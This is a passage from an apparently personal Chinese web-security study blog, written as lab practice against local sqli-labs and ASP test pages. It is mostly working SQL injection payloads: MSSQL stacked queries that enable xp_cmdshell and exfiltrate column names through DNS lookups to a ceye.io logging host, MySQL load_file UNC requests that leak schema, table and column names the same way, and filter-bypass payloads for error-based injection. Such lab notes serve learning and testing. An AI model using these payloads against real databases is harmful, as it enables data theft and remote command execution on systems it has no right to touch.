+<h4 id="使用-xp-fileexist"><a href="#使用-xp-fileexist" class="headerlink" title="使用 xp_fileexist"></a>使用 <code>xp_fileexist</code></h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=(select top 1 column_name from information_schema.columns where table_name=&apos;users&apos; and column_name not in (&apos;id&apos;, &apos;username&apos;) );exec(&apos;master..xp_fileexist &quot;//&apos; %2b @a %2b &apos;.fileexist.9rq9q9.ceye.io/a&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog23.png" alt></p>
+<p><img src="/images/193dnslog22.png" alt></p>
+<h4 id="使用-xp-cmdshell"><a href="#使用-xp-cmdshell" class="headerlink" title="使用 xp_cmdshell"></a>使用 <code>xp_cmdshell</code></h4><p>现在数据库中打开 <code>xp_cmdshell</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">EXEC sp_configure &apos;show advanced options&apos;,1</span><br><span class="line">RECONFIGURE</span><br><span class="line">EXEC sp_configure &apos;xp_cmdshell&apos;,1</span><br><span class="line">RECONFIGURE</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog24.png" alt></p>
+<p>先在数据库中执行下面命令，看是否正确。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">declare @a varchar(1024);</span><br><span class="line">set @a=&apos;www.baidu.com&apos;;</span><br><span class="line">exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);</span><br><span class="line">reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);</span><br><span class="line">reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; + @a + &apos;.cmdshell.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p>我们可以看到执行的结果。</p>
+<p><img src="/images/193dnslog45.png" alt></p>
+<p><img src="/images/193dnslog46.png" alt></p>
+<p>在 <code>Hackbar</code>执行命令</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.237/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;; exec(&apos;sp_configure &quot;show advanced options&quot;,1&apos;);reconfigure;exec(&apos;sp_configure &quot;xp_cmdshell&quot;,1&apos;);reconfigure;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.hackbarcmd.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog47.png" alt></p>
+<p><img src="/images/193dnslog48.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.179.131/less-6.asp?id=1; declare @a varchar(1024); set @a=&apos;www.baidu.com&apos;;exec (&apos;master..xp_cmdshell &quot;ping &apos; %2b @a %2b &apos;.han.9rq9q9.ceye.io&quot; &apos;)</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog25.png" alt></p>
+<p><img src="/images/193dnslog26.png" alt></p>
+<h3 id="MySQL-的-dnslog-外带数据注入"><a href="#MySQL-的-dnslog-外带数据注入" class="headerlink" title="MySQL 的 dnslog 外带数据注入"></a><code>MySQL</code> 的 <code>dnslog</code> 外带数据注入</h3><p><code>window</code>下在 <code>phpstudy_pro</code> 中 <code>C:\phpstudy_pro\Extensions\MySQL8.0.12</code> 下的 <code>my.ini</code>中添加：</p>
+<p><code>secure_file_priv=</code> 重启服务。</p>
+<p><img src="/images/193dnslog49.png" alt></p>
+<h4 id="查询库名-1"><a href="#查询库名-1" class="headerlink" title="查询库名"></a>查询库名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog27.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT schema_name FROM information_schema.schemata limit 1,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog28.png" alt></p>
+<h4 id="查询-security-库中的表名"><a href="#查询-security-库中的表名" class="headerlink" title="查询 security 库中的表名"></a>查询 <code>security</code> 库中的表名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT table_name FROM information_schema.tables WHERE table_schema=&apos;security&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog43.png" alt></p>
+<p><strong>注</strong>：也可以使用 <code>database()</code> 函数代替 <code>security</code>，不过要记住要先使用命令 <code>use security;</code> 否则会因当前没有使用的数据库造成失败。</p>
+<h4 id="查询-emails-表中列名"><a href="#查询-emails-表中列名" class="headerlink" title="查询 emails 表中列名"></a>查询 <code>emails</code> 表中列名</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select load_file(CONCAT(&apos;\\\\&apos;,(SELECT column_name FROM information_schema.columns WHERE table_schema=&apos;security&apos; and table_name = &apos;emails&apos; limit 0,1), &apos;.mysql.9rq9q9.ceye.io\\abc&apos;))</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog44.png" alt></p>
+<h3 id="sqli-labs-Less-25"><a href="#sqli-labs-Less-25" class="headerlink" title="sqli-labs Less-25"></a><code>sqli-labs Less-25</code></h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog30.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos;</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog31.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog32.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; and &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog33.png" alt></p>
+<p>发现页面变化了，并且把我们输入的 <code>and</code> 和 <code>or</code>给过滤掉了。改变单词内某些字母的大小写，依然无济于事。尝试用 <code>&amp;&amp;</code> 和 <code>||</code>。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || &apos;1&apos;=&apos;1 -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog35.png" alt></p>
+<p>可以在网页上清除看到，<code>||</code> 并没有被过滤掉。</p>
+<p>这里可以选择联合查询</p>
+<p><img src="/images/193dnslog36.png" alt></p>
+<p>由于数据库错误会提示报错信息，所以也可以选择报错注入。在这里我们通过 <code>&amp;&amp;</code> 和<code>||</code>注入。</p>
+ <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; &amp;&amp; updatexml(1, concat(&apos;~&apos;,(select database()), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog38.png" alt></p>
+<p>可以发现 <code>&amp;&amp;</code> 及其后面的内容全部过滤掉了。</p>
+<p>尝试使用 <code>||</code></p>
+<p><img src="/images/193dnslog39.png" alt></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from information_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog40.png" alt></p>
+<p>发现把 <code>information_schema</code> 中的 <code>or</code> 给过滤掉了，尝试下 <code>infoorrmation_schema</code></p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.43.204/sqli-labs/Less-25?id=1&apos; || updatexml(1, concat(&apos;~&apos;,(select group_concat(table_name) from infoorrmation_schema.tables where table_schema=&apos;security&apos;), &apos;~&apos;), 1)  -- |</span><br></pre></td></tr></table></figure>
+
+<p><img src="/images/193dnslog41.png" alt></p>
+<p>同理我们也可以查到列名。</p>
+<p><img src="/images/193dnslog42.png" alt></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">TAGGED IN</span><br/>
+                
+    <a class="tag tag--primary tag--small t-link" href="/tags/Access-注入-Mssql-注入/">Access 注入 - Mssql 注入</a> <a class="tag tag--primary tag--small t-link" href="/tags/dnslog/">dnslog</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/05/note38/"
+                    data-tooltip="note38"
+                    aria-label="PREVIOUS: note38"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/04/note37/"
+                    data-tooltip="note37"
+                    aria-label="NEXT: note37"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+            
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2019 han. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/05/note38/"
+                    data-tooltip="note38"
+                    aria-label="PREVIOUS: note38"
+                >
+                    
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">PREVIOUS</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2019/09/04/note37/"
+                    data-tooltip="note37"
+                    aria-label="NEXT: note37"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">NEXT</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Share this post"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Facebook"
+                    aria-label="Share on Facebook"
+                >
+                    <i class="fab fa-facebook" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Twitter"
+                    aria-label="Share on Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=http://yoursite.com/2019/09/04/practice14/"
+                    title="Share on Google+"
+                    aria-label="Share on Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+            
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="Table of Contents">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://www.facebook.com/sharer/sharer.php?u=http://yoursite.com/2019/09/04/practice14/"
+                        aria-label="Share on Facebook"
+                    >
+                        <i class="fab fa-facebook" aria-hidden="true"></i><span>Share on Facebook</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=http://yoursite.com/2019/09/04/practice14/"
+                        aria-label="Share on Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>Share on Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=http://yoursite.com/2019/09/04/practice14/"
+                        aria-label="Share on Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>Share on Google+</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+    
+        
+    
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <img id="about-card-picture" src="/assets/images/headimg.jpg" alt="Author&#39;s picture"/>
+        
+            <h4 id="about-card-name">han</h4>
+        
+            <div id="about-card-bio"><p>life and code</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>Web Security</p>
+
+            </div>
+        
+        
+            <div id="about-card-location">
+                <i class="fa fa-map-marker-alt"></i>
+                <br/>
+                Beijing, China
+            </div>
+        
+    </div>
+</div>
+
+        
+            <div id="algolia-search-modal" class="modal-container">
+    <div class="modal">
+        <div class="modal-header">
+            <span class="close-button"><i class="fa fa-times"></i></span>
+            <a href="https://algolia.com" target="_blank" rel="noopener" class="searchby-algolia text-color-light link-unstyled">
+                <span class="searchby-algolia-text text-color-light text-small">by</span>
+                <img class="searchby-algolia-logo" src="/assets/images/logo-algolia-nebula-blue-full.svg">
+            </a>
+            <i class="search-icon fa fa-search"></i>
+            <form id="algolia-search-form">
+                <input type="text" id="algolia-search-input" name="search"
+                    class="form-control input--large search-input" placeholder="Search "
+                    />
+            </form>
+        </div>
+        <div class="modal-body">
+            <div class="no-result text-color-light text-center">no post found</div>
+            <div class="results">
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa-deploy"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/image-gallery-showcase/city-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/dvwa-deploy/"
+                            aria-label=": dvwa-deploy"
+                        >
+                            <h3 class="media-heading">dvwa-deploy</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: CentOS7部署DVWA</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin-bug"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/japanese-test-post/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/28/phpmyadmin-bug/"
+                            aria-label=": phpmyadmin-bug"
+                        >
+                            <h3 class="media-heading">phpmyadmin-bug</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 28, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: phpmyadmin4.8漏洞演示</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/noteday11/"
+                            aria-label=": note11"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/elements-showcase/vintage-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/noteday11/"
+                            aria-label=": note11"
+                        >
+                            <h3 class="media-heading">note11</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 本文档主要记录2019/07/29学习的主要内容</p>
+<a id="more"></a></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": week2sum"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/week2sum/"
+                            aria-label=": week2sum"
+                        >
+                            <h3 class="media-heading">week2sum</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 对第二周学习的内容进行总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1367188/pexels-photo-1367188.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/29/simpleapp/"
+                            aria-label=": markdown语法"
+                        >
+                            <h3 class="media-heading">markdown语法</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 29, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 用typora写markdown文档的语法</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1564414872027-5ae7dac9a76f?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=700&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/stage1-exam/"
+                            aria-label=": stage1知识盲点"
+                        >
+                            <h3 class="media-heading">stage1知识盲点</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 知识盲点总结</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": note12"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1561363702-e07252da3399?ixlib=rb-1.2.1&amp;ixid=eyJhcHBfaWQiOjEyMDd9&amp;auto=format&amp;fit=crop&amp;w=1050&amp;q=80" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/07/30/note12/"
+                            aria-label=": note12"
+                        >
+                            <h3 class="media-heading">note12</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Jul 30, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初学HTML</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": note13"
+                        >
+                            <img class="media-image" src="https://images.unsplash.com/photo-1563930365798-3014c158554f?ixlib=rb-1.2.1&amp;auto=format&amp;fit=crop&amp;w=500&amp;q=60" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note13/"
+                            aria-label=": note13"
+                        >
+                            <h3 class="media-heading">note13</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: 初探CSS+JS</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": note14"
+                        >
+                            <img class="media-image" src="https://images.pexels.com/photos/1656584/pexels-photo-1656584.jpeg?auto=compress&amp;cs=tinysrgb&amp;dpr=1&amp;w=500" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/01/note14/"
+                            aria-label=": note14"
+                        >
+                            <h3 class="media-heading">note14</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 1, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: JS BOM和jQuery，以及php环境的搭建</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+                <div class="media">
+                    
+                    <div class="media-left">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
+                        >
+                            <img class="media-image" src="http://d1u9biwaxjngwg.cloudfront.net/hexo-website/peak-140.jpg" width="90" height="90"/>
+                        </a>
+                    </div>
+                    
+                    <div class="media-body">
+                        <a
+                            class="link-unstyled"
+                            href="http://yoursite.com/2019/08/03/note15/"
+                            aria-label=": note15"
+                        >
+                            <h3 class="media-heading">note15</h3>
+                        </a>
+                        <span class="media-meta">
+                            <span class="media-date text-small">
+                                
+                                    Aug 3, 2019
+                                
+                            </span>
+                        </span>
+                        <div class="media-content hide-xs font-merryweather"><p><strong>Abstract</strong>: php基础语法和变量</p></div>
+                    </div>
+                    <div style="clear:both;"></div>
+                    <hr>
+                </div>
+                
+            </div>
+        </div>
+        <div class="modal-footer">
+            <p class="results-count text-medium"
+                data-message-zero="no post found"
+                data-message-one="1 post found"
+                data-message-other="{n} posts found">
+                56 posts found
+            </p>
+        </div>
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+<script src="/assets/js/script-miftf8se61zspg5fcsur8f7clgivo7gvevo5wqy4l6pigmbhx9ujvpue2enp.min.js"></script>
+<!--SCRIPTS END-->
+
+
+    
+
+
+
+    <script src="/assets/js/moment-with-locales.js"></script>
+    <script src="/assets/js/algoliasearch.js"></script>
+    <script>
+      var algoliaClient = algoliasearch('QHU2Y8U611', 'c66d405f4a2145e747c10a811d8acae2');
+      var algoliaIndex = algoliaClient.initIndex('tranquilpeak');
+    </script>
+
+
+    </body>
+</html>
